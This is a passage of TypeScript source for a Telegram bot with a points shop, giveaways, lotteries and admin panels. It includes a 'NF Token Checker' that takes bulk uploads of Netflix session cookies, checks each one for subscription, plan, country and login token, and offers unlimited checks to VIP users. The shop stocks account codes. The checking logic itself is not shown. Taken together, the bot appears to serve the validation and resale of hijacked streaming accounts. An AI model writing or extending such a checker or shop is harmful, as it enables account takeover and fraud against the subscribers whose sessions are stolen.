          return bot.sendMessage(chatId, `⭐ <b>Account Ratings</b>\n${"─".repeat(30)}\n\n📭 No ratings yet.`, { parse_mode: "HTML", ...adminMenu() });
        }
        const { avg, total } = await storage.getAverageRating();
        const avgStars = "⭐".repeat(Math.round(avg));
        const recent = allRatings.slice(-10).reverse();
        let msg = `⭐ <b>Account Ratings</b>\n${"─".repeat(30)}\n\n`;
        msg += `📊 <b>Overall:</b> ${avgStars} ${avg.toFixed(1)}/5 (${total} ratings)\n\n`;
        msg += `📋 <b>Recent Ratings:</b>\n\n`;
        for (const r of recent) {
          const s = "⭐".repeat(r.rating);
          const date = new Date(r.createdAt).toLocaleDateString();
          msg += `${s} — <b>${esc(r.itemName)}</b>\n👤 @${esc(r.username)} • ${date}\n\n`;
        }
        if (total > 10) msg += `<i>...and ${total - 10} more ratings</i>`;
        const distrib: Record<number, number> = { 1: 0, 2: 0, 3: 0, 4: 0, 5: 0 };
        for (const r of allRatings) distrib[r.rating] = (distrib[r.rating] || 0) + 1;
        msg += `\n📊 <b>Distribution:</b>\n`;
        for (let i = 5; i >= 1; i--) {
          const pct = total > 0 ? Math.round((distrib[i] / total) * 100) : 0;
          const bar = "█".repeat(Math.round(pct / 5)) || "░";
          msg += `${"⭐".repeat(i)} ${bar} ${distrib[i]} (${pct}%)\n`;
        }
        return bot.sendMessage(chatId, msg, { parse_mode: "HTML", ...adminMenu() });
      }

      if (text === "🔄 Reset All Points") {
        if (!isAdmin) return;
        return bot.sendMessage(chatId,
          `⚠️ <b>Reset All Points</b>\n${"─".repeat(30)}\n\n🚨 This will set ALL users' points to 0!\n\nAre you sure?`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⚠️ Yes, I'm sure", callback_data: "reset_points_confirm1" }],
                [{ text: "❌ Cancel", callback_data: "reset_points_cancel" }],
              ]
            }
          }
        );
      }

      if (text === "🔑 NF Token Checker" || text === "🔑 NF Checker") {
        if (isCheckerLocked && !isAdmin) return bot.sendMessage(chatId, "🔒 The NF Checker is currently locked by admin. Please try again later.");
        pending[Number(tgUserId)] = { action: "nf_check" };
        const vip = isVipChecker(tgUserId);
        const vipInfo = vip ? getVipInfo(tgUserId) : null;
        let limitLine = `📋 Limit: <b>${MAX_COOKIES_NORMAL} cookies</b>`;
        if (isAdmin) {
          limitLine = `👑 Admin — <b>Unlimited</b>`;
        } else if (vip && vipInfo) {
          const exp = vipInfo.expiresAt ? `Expires: ${new Date(vipInfo.expiresAt).toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" })}` : "♾️ No expiration";
          limitLine = `👑 VIP — <b>Unlimited</b> | ${exp}`;
        }
        return bot.sendMessage(chatId,
          `🔑 <b>NF Token Checker</b>\n${"─".repeat(30)}\n\n${limitLine}\n\n📋 Send Netflix cookies (NetflixId values)\n\n📝 <b>Format:</b>\n• One cookie per line (text)\n• 📄 Any file type (.txt, .csv, .json, etc.)\n• 📦 .zip file (auto-extract)\n\n⏳ Each cookie will be checked for:\n✅ Active subscription\n🌍 Country\n📦 Plan type\n🔗 Login token\n\n💡 Send your cookies now or type /cancel`,
          { parse_mode: "HTML" }
        );
      }

      if (text === "👑 VIP Checker") {
        if (!isAdmin) return;
        loadVipCheckers();
        const activeVips = vipCheckers.filter(v => !v.expiresAt || v.expiresAt > Date.now());
        let vipList = "";
        if (activeVips.length > 0) {
          vipList = activeVips.map((v, i) => {
            const exp = v.expiresAt ? new Date(v.expiresAt).toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" }) : "♾️ Unlimited";
            return `${i + 1}. @${esc(v.username)} — ${exp}`;
          }).join("\n");
        } else {
          vipList = "No VIP users yet.";
        }
        return bot.sendMessage(chatId,
          `👑 <b>VIP Checker Manager</b>\n${"─".repeat(30)}\n\n📊 Active VIPs: <b>${activeVips.length}</b>\n📋 Normal limit: <b>${MAX_COOKIES_NORMAL} cookies</b>\n\n${vipList}\n\n📝 <b>Commands:</b>\n• <code>/vip add @username</code> — Unlimited\n• <code>/vip add @username 7d</code> — 7 days\n• <code>/vip add @username 30d</code> — 30 days\n• <code>/vip remove @username</code> — Remove VIP\n• <code>/vip list</code> — List all VIPs`,
          { parse_mode: "HTML" }
        );
      }

      if (text === "🎫 Animatrix") {
        if (!isAdmin) return;
        const allCodes = await storage.getAllAnimatrixCodes();
        const available = allCodes.filter(c => !c.isUsed);
        const used = allCodes.filter(c => c.isUsed);
        return bot.sendMessage(chatId,
          `🎫 <b>Animatrix Admin Panel</b>\n${"─".repeat(30)}\n\n✅ Available: <b>${available.length}</b>\n⛔ Used: <b>${used.length}</b>\n📊 Total: <b>${allCodes.length}</b>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "➕ Add Account", callback_data: "ax_add_start" }],
                [{ text: "🗂 List Codes", callback_data: "ax_list" }, { text: "📈 Statistics", callback_data: "ax_stats" }],
                [{ text: "🗑 Delete Code", callback_data: "ax_del_prompt" }, { text: "📋 Redemptions", callback_data: "ax_redemptions" }],
              ]
            }
          }
        );
      }

      if (text === "🎁 Giveaway Control") {
        if (!isAdmin) return;
        const giveawayStatus = isGiveawayEnabled ? "✅ ENABLED" : "❌ DISABLED";
        const btns: TelegramBot.InlineKeyboardButton[][] = [];
        if (giveaway.active) {
          const timeLeft = formatTimeLeft(giveaway.endTime - Date.now());
          btns.push([{ text: "🏆 Draw Now", callback_data: "giveaway_draw_now" }]);
          btns.push([{ text: "❌ Cancel Giveaway", callback_data: "giveaway_cancel" }]);
          btns.push([{ text: isGiveawayEnabled ? "🔴 Disable for Users" : "🟢 Enable for Users", callback_data: isGiveawayEnabled ? "giveaway_toggle_off" : "giveaway_toggle_on" }]);
          return bot.sendMessage(chatId,
            `🎁 <b>Giveaway Control</b>\n${"─".repeat(30)}\n\n📊 User Button: ${giveawayStatus}\n\n🏆 Prize: 1 point\n👥 Participants: ${giveaway.participants.length}\n⏳ Ends in: ${timeLeft}\n${giveaway.requiredReferrals > 0 ? `📨 Required Referrals: ${giveaway.requiredReferrals}` : "📨 No referral requirement"}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: btns } }
          );
        }
        btns.push([{ text: "🎁 Start New Giveaway", callback_data: "giveaway_start_new" }]);
        btns.push([{ text: isGiveawayEnabled ? "🔴 Disable for Users" : "🟢 Enable for Users", callback_data: isGiveawayEnabled ? "giveaway_toggle_off" : "giveaway_toggle_on" }]);
        return bot.sendMessage(chatId,
          `🎁 <b>Giveaway Control</b>\n${"─".repeat(30)}\n\n📊 User Button: ${giveawayStatus}\n\n❌ No active giveaway right now.`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: btns } }
        );
      }

      if (text === "🎰 Lottery Control") {
        if (!isAdmin) return;
        const status = lotteryActive ? "✅ ACTIVE" : "❌ INACTIVE";
        return bot.sendMessage(chatId,
          `🎰 Lottery Control\n${"─".repeat(30)}\n\nStatus: ${status}\n🏆 Prize: 1 point\n👥 Players: ${lotteryPool.length}`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: lotteryActive
                ? [
                    [{ text: "🏆 Draw Winner", callback_data: "lottery_draw" }],
                    [{ text: "❌ Cancel Lottery", callback_data: "lottery_cancel" }],
                  ]
                : [[{ text: "🎰 Start Lottery", callback_data: "lottery_start" }]],
            },
          }
        );
      }

      if (text === "🔒 Lock Controls") {
        if (!isAdmin) return;
        const shopStatus = isShopLocked ? "🔴 Locked" : "🟢 Open";
        const checkerStatus = isCheckerLocked ? "🔴 Locked" : "🟢 Open";
        const transferStatus = isTransferLocked ? "🔴 Locked" : "🟢 Open";
        const gameStatus = isGameEnabled ? "🟢 Open" : "🔴 Locked";
        return bot.sendMessage(chatId,
          `🔒 Lock Controls\n${"─".repeat(30)}\n\n🛍️ Shop: ${shopStatus}\n🔑 NF Checker: ${checkerStatus}\n💸 Transfers: ${transferStatus}\n🎮 Games: ${gameStatus}\n\nTap a button to toggle:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: `${isShopLocked ? "🔓 Unlock" : "🔒 Lock"} Shop`, callback_data: "lock_shop" }],
                [{ text: `${isCheckerLocked ? "🔓 Unlock" : "🔒 Lock"} NF Checker`, callback_data: "lock_checker" }],
                [{ text: `${isTransferLocked ? "🔓 Unlock" : "🔒 Lock"} Transfers`, callback_data: "lock_transfer" }],
              ],
            },
          }
        );
      }

      if (text === "💬 Welcome Message") {
        if (!isAdmin) return;
        const current = customWelcomeMessage || "(Default message)";
        pending[Number(tgUserId)] = { action: "set_welcome" };
        return bot.sendMessage(chatId,
          `💬 Custom Welcome Message\n${"─".repeat(30)}\n\n📝 Current:\n${esc(current)}\n\n📌 Variables you can use:\n• {username} — User's name\n• {points} — User's points\n• {referrals} — Referral count\n• {referral_link} — Referral link\n\nSend your new welcome message or type "reset" to use default:`,
          { parse_mode: "HTML" }
        );
      }

      if (text === "🔔 Stock Alert") {
        if (!isAdmin) return;
        const storeItems = await storage.getItems();
        if (storeItems.length === 0) return bot.sendMessage(chatId, "❌ No items in shop yet.", adminMenu());
        const buttons = storeItems.map(item => {
          const stockTxt = item.stock !== null && item.stock !== undefined ? item.stock : "∞";
          return [{ text: `🔔 ${item.name} (Stock: ${stockTxt})`, callback_data: `stockalert:${item.id}` }];
        });
        buttons.push([{ text: "📢 Alert All Items", callback_data: "stockalert:all" }]);
        return bot.sendMessage(chatId,
          `🔔 Stock Alert\n${"─".repeat(30)}\n\nChoose which item to notify users about:`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }

      if (text === "📋 Activity Logs") {
        if (!isAdmin) return;
        loadActivityLogs();
        if (activityLogs.length === 0) return bot.sendMessage(chatId, "📋 No activity logs yet.", adminMenu());
        const recent = activityLogs.slice(-20).reverse();
        let logMsg = `📋 Activity Logs (Last ${recent.length})\n${"─".repeat(30)}\n\n`;
        const typeEmoji: Record<string, string> = { purchase: "🛒", transfer: "💸", game: "🎮", redeem: "🎟️", checker: "🔑" };
        for (const log of recent) {
          const d = new Date(log.timestamp);
          const time = `${d.getDate()}/${d.getMonth() + 1} ${d.getHours().toString().padStart(2, "0")}:${d.getMinutes().toString().padStart(2, "0")}`;
          logMsg += `${typeEmoji[log.type] || "📌"} [${time}] @${esc(log.username)}\n   ${log.details}\n\n`;
        }
        if (activityLogs.length > 20) logMsg += `📊 Total logs: ${activityLogs.length}`;
        return bot.sendMessage(chatId, logMsg, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📄 Export All Logs", callback_data: "export_logs" }],
              [{ text: "🗑 Clear Logs", callback_data: "clear_logs" }],
            ],
          },
          ...adminMenu(),
        });
      }

      if (text === "📖 Admin Help") {
        const helpText =
          `📖 Admin Help — Commands & Guide\n${"─".repeat(32)}\n\n` +
          `🔹 User Management\n` +
          `• 👥 Users — View all registered users\n` +
          `• ➕ Add Points — Give points to a user\n  Format: @username amount\n` +
          `• ➖ Remove Points — Take points from a user\n  Format: @username amount\n` +
          `• 🚫 Ban User — Ban a user with reason\n  Format: @username|reason\n` +
          `• ✅ Unban User — Unban a user\n  Format: @username\n\n` +
          `🔹 Shop Management\n` +
          `• 🛍️ Items — View all shop items\n` +
          `• /additem — Add new item\n  Format: /additem Name|Price|Description\n` +
          `• /delitem — Delete an item\n  Format: /delitem itemId\n` +
          `• 📦 Add Stock — Add account codes (with buttons)\n\n` +
          `🔹 Game Control\n` +
          `• 🎮 Game Control — Enable/disable the game\n\n` +
          `🔹 Moderation\n` +
          `• ⚠️ Warn User — Warn a user (3 = auto-ban)\n  Format: @username\n` +
          `• ⏱ Temp Ban — Temporarily ban a user\n  Format: @username hours\n` +
          `• 🎁 Gift All — Give points to all users\n` +
          `• 🎰 Lottery Control — Start/draw/cancel lottery\n\n` +
          `🔹 Other\n` +
          `• 📊 Bot Stats — Total users & purchases\n` +
          `• 📢 Broadcast — Send message to all users\n` +
          `• 💾 Backup — Export data (Owner only)\n` +
          `• 👑 Admins — Manage admins (Owner only)\n` +
          `  /addadmin telegramId\n  /removeadmin telegramId\n` +
          `• /setpoints — Set exact points\n  Format: /setpoints @username amount`;
        return bot.sendMessage(chatId, helpText, { parse_mode: "HTML", ...adminMenu() });
      }

      if (text === "💾 Backup") {
        if (!isBotOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ This feature is for the owner only.", adminMenu());
        return bot.sendMessage(chatId, `💾 Backup — Choose what to export:`, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📦 Backup Stock Codes", callback_data: "backup_codes" }],
              [{ text: "👥 Backup Users Data", callback_data: "backup_users" }],
              [{ text: "📂 Backup Bot Source Code", callback_data: "backup_source" }],
            ],
          },
        });
      }

    } catch (err: any) {
      console.error("Error in message handler:", err.message);
    }
  });

  bot.on("polling_error", (err) => { console.error("Bot polling error:", err.message); });

  setInterval(() => {
    const sKeys = Object.keys(startCache);
    if (sKeys.length > 100) for (const k of sKeys) delete startCache[parseInt(k)];
    const wKeys = Object.keys(waitingScreenshot);
    if (wKeys.length > 5000) for (const k of wKeys) delete waitingScreenshot[parseInt(k)];
    const pKeys = Object.keys(pending);
    if (pKeys.length > 5000) for (const k of pKeys) delete pending[parseInt(k)];
    const rKeys = Object.keys(ratingPending);
    if (rKeys.length > 5000) for (const k of rKeys) delete ratingPending[parseInt(k)];
  }, 60 * 60 * 1000);

  console.log("✅ Bot is running!");
}
